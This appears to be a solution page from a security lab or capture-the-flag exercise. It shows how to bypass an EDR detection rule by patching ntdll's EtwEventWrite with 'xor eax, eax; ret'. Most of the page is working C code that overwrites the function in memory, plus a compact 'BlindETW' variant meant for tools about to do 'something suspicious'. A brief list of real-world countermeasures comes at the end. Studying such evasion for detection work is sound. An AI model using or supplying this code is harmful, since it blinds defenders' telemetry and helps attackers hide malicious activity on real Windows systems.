---
layout: default
title: "Solution 26: Patch EtwEventWrite"
---

# Solution 26: Patch EtwEventWrite

## The Bypass

Patch `ntdll!EtwEventWrite` in the EDR agent's process memory with `xor eax, eax; ret` — this makes the function return `STATUS_SUCCESS` (0) without emitting any event.

Rule 8 only checks if the first byte is `0xC3` (bare `ret`). The `xor eax, eax; ret` pattern starts with `0x33`, so it evades the check.

### C Implementation

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Get EtwEventWrite address
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    if (!pEtwEventWrite) {
        printf("[-] EtwEventWrite not found\n");
        return 1;
    }
    
    printf("[*] EtwEventWrite @ %p\n", pEtwEventWrite);
    printf("[*] Original bytes: %02X %02X %02X\n",
        ((BYTE*)pEtwEventWrite)[0],
        ((BYTE*)pEtwEventWrite)[1],
        ((BYTE*)pEtwEventWrite)[2]);
    
    // Patch: xor eax, eax; ret
    // Bytes: 0x33 0xC0 0xC3
    // This returns 0 (STATUS_SUCCESS) without logging
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    
    // Change memory protection
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, sizeof(patch), 
                   PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Write the patch
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    
    // Restore protection
    VirtualProtect(pEtwEventWrite, sizeof(patch), 
                   oldProtect, &oldProtect);
    
    printf("[+] EtwEventWrite patched (xor eax,eax; ret)\n");
    printf("[+] First byte is 0x33, not 0xC3 — Rule 8 won't detect\n");
    
    return 0;
}
```

### Why `xor eax, eax; ret` and not just `ret`?

| Patch | Bytes | First Byte | Rule 8 Detects? | Caller sees |
|-------|-------|-----------|-----------------|-------------|
| `ret` | `C3` | `0xC3` | **YES** | Random EAX value (may cause errors) |
| `xor eax, eax; ret` | `33 C0 C3` | `0x33` | **NO** | 0 = STATUS_SUCCESS |

The `xor eax, eax` sets the return value to 0, so callers believe the ETW write succeeded. This is stealthier than a bare `ret` which leaves a garbage return value.

## Self-Patching Variant

If you're writing a tool that wants to blind its own ETW before doing something suspicious:

```c
void BlindETW() {
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    void* addr = GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD old;
    VirtualProtect(addr, 3, PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, patch, 3);
    VirtualProtect(addr, 3, old, &old);
}
```

## Why It Works

- `EtwEventWrite` is a **user-mode** function in `ntdll.dll` — any process can patch its own copy
- The function is the **single chokepoint** for all user-mode ETW providers
- Rule 8 only checks for the `0xC3` pattern (bare ret), not `0x33` (xor)
- The EDR has no kernel-mode component to detect the patch

## Real-World Countermeasures

- **ETW-TI** (kernel-mode) fires events from kernel space, bypassing user-mode ntdll entirely
- Memory integrity monitoring (checking code hashes against on-disk originals)
- Code flow integrity / CFI preventing arbitrary code modification
- Modern EDRs combine multiple telemetry sources — blinding ETW alone isn't sufficient

## Further Reading

- [Breaking ETW and EDR](https://benjitrapp.github.io/attacks/2024-02-11-offensive-etw/)
- [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/)
